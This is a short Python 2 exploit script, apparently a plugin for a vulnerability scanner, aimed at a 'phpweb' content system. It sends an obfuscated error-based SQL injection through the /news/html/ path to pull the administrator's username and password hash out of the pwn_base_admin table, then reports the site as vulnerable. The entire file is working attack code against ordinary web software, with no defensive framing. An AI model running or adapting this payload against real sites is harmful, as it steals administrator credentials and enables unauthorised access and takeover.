def exploit(url):
	poc = "http://"+url+"/news/html/?410'union/**/select/**/1/**/from/**/(select/**/count(*),concat(floor(rand(0)*2),0x3a,(select/**/concat(user,0x3d,password)/**/from/**/pwn_base_admin/**/limit/**/0,1),0x3a)a/**/from/**/information_schema.tables/**/group/**/by/**/a)b/**/where'1'='1.html"
	try:
		ok=fuck.urlget(poc)
		if ok.getcode() == 200:
			tmp=fuck.find("\w+=\w{32}",ok.read())
			if len(tmp)>0:
				fuck.report('phpweb_SQLInject',"http://%s<br>%s"%(test_url,tmp[0]))
				print "TARGET phpweb_SQLInject VULNERABLE !"
	except Exception,e:
		print e
exploit(test_url)